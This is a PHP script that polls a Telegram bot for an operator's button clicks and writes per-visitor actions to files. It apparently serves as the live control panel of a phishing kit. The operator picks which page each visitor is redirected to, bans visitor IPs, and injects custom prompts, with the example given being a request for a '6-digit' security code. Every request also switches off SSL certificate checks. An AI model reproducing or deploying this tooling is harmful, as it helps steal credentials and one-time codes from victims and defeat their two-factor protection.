<?php
// POLL TELEGRAM FOR BUTTON CLICKS
require_once(__DIR__ . '/../config.php');

// Get last update ID
$lastUpdateId = 0;
if (file_exists(UPDATES_FILE)) {
    $lastUpdateId = (int)file_get_contents(UPDATES_FILE);
}

// Get updates from Telegram
$url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/getUpdates?offset=" . ($lastUpdateId + 1) . "&timeout=5";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$response = curl_exec($ch);
curl_close($ch);

$result = json_decode($response, true);

if (!$result['ok'] || empty($result['result'])) {
    exit;
}

// Process each update
foreach ($result['result'] as $update) {
    $updateId = $update['update_id'];
    
    // Save last update ID
    file_put_contents(UPDATES_FILE, $updateId);
    
    // Check for text message (admin sending custom text)
    if (isset($update['message']['text'])) {
        $text = $update['message']['text'];
        $chatId = $update['message']['chat']['id'];
        
        // Check if any token is waiting for custom text
        $actions = file_exists(ACTIONS_FILE) ? json_decode(file_get_contents(ACTIONS_FILE), true) : [];
        
        if (!is_array($actions)) {
            $actions = [];
        }
        
        foreach ($actions as $token => $actionData) {
            if (isset($actionData['waiting_custom']) && $actionData['waiting_custom'] === true) {
                // Parse the 2 lines
                $lines = explode("\n", $text, 2);
                
                if (count($lines) >= 2) {
                    $label = trim($lines[0]);
                    $placeholder = trim($lines[1]);
                    
                    // Save custom text for this token
                    $actions[$token]['custom_label'] = $label;
                    $actions[$token]['custom_placeholder'] = $placeholder;
                    $actions[$token]['waiting_custom'] = false;
                    file_put_contents(ACTIONS_FILE, json_encode($actions));
                    
                    // Confirm to admin
                    $confirmUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
                    $confirmData = [
                        'chat_id' => $chatId,
                        'text' => "✅ <b>Custom input configured!</b>\n\n<b>Label:</b> {$label}\n<b>Placeholder:</b> {$placeholder}\n\n👤 User will now see this custom input.",
                        'parse_mode' => 'HTML'
                    ];
                    
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $confirmUrl);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($confirmData));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_exec($ch);
                    curl_close($ch);
                    
                    break;
                } else {
                    // Invalid format
                    $errorUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
                    $errorData = [
                        'chat_id' => $chatId,
                        'text' => "❌ Please send 2 lines:\n\nLine 1: Label\nLine 2: Placeholder",
                        'parse_mode' => 'HTML'
                    ];
                    
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $errorUrl);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($errorData));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_exec($ch);
                    curl_close($ch);
                    
                    break;
                }
            }
        }
    }
    
    // Check for callback query (button click)
    if (isset($update['callback_query'])) {
        $callbackData = $update['callback_query']['data'];
        $chatId = $update['callback_query']['message']['chat']['id'];
        $messageId = $update['callback_query']['message']['message_id'];
        
        // Parse callback data
        $parts = explode('_', $callbackData);
        
        if ($parts[0] === 'action' && count($parts) >= 3) {
            // Action: action_TOKEN_PAGENAME
            $token = $parts[1];
            $action = $parts[2];
            
            // Save action for user
            $actions = file_exists(ACTIONS_FILE) ? json_decode(file_get_contents(ACTIONS_FILE), true) : [];
            $actions[$token] = [
                'action' => $action,
                'timestamp' => time()
            ];
            
            // If custom action, ask admin for label and placeholder
            if ($action === 'custom') {
                $actions[$token]['waiting_custom'] = true;
                file_put_contents(ACTIONS_FILE, json_encode($actions));
                
                // Answer callback and ask for custom text
                $answerUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/answerCallbackQuery";
                $answerData = [
                    'callback_query_id' => $update['callback_query']['id'],
                    'text' => "📝 Please send 2 lines"
                ];
                
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $answerUrl);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($answerData));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_exec($ch);
                curl_close($ch);
                
                // Send message asking for custom text
                $messageUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
                $messageData = [
                    'chat_id' => $chatId,
                    'text' => "📝 <b>Custom Input Setup</b>\n\nPlease send 2 lines:\n\n<b>Line 1:</b> Label (question to show user)\n<b>Line 2:</b> Placeholder (hint in input field)\n\n<i>Example:</i>\nWhat is your security code?\nEnter 6-digit code",
                    'parse_mode' => 'HTML'
                ];
                
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $messageUrl);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($messageData));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_exec($ch);
                curl_close($ch);
            } else {
                file_put_contents(ACTIONS_FILE, json_encode($actions));
                
                // Answer callback for other actions
                $answerUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/answerCallbackQuery";
                $answerData = [
                    'callback_query_id' => $update['callback_query']['id'],
                    'text' => "✅ User will be redirected to " . strtoupper($action)
                ];
                
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $answerUrl);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($answerData));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_exec($ch);
                curl_close($ch);
            }
            
        } elseif ($parts[0] === 'ban' && count($parts) >= 3) {
            // Ban IP: ban_TOKEN_IP
            $token = $parts[1];
            $ip = $parts[2];
            
            // Ban the IP
            $banned = file_exists(BANNED_IPS_FILE) ? json_decode(file_get_contents(BANNED_IPS_FILE), true) : [];
            $banned[$ip] = [
                'banned_at' => time(),
                'banned_date' => date('Y-m-d H:i:s')
            ];
            file_put_contents(BANNED_IPS_FILE, json_encode($banned, JSON_PRETTY_PRINT));
            
            // Answer callback
            $answerUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/answerCallbackQuery";
            $answerData = [
                'callback_query_id' => $update['callback_query']['id'],
                'text' => "🚫 IP {$ip} has been banned"
            ];
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $answerUrl);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($answerData));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_exec($ch);
            curl_close($ch);
        }
    }
}
?>

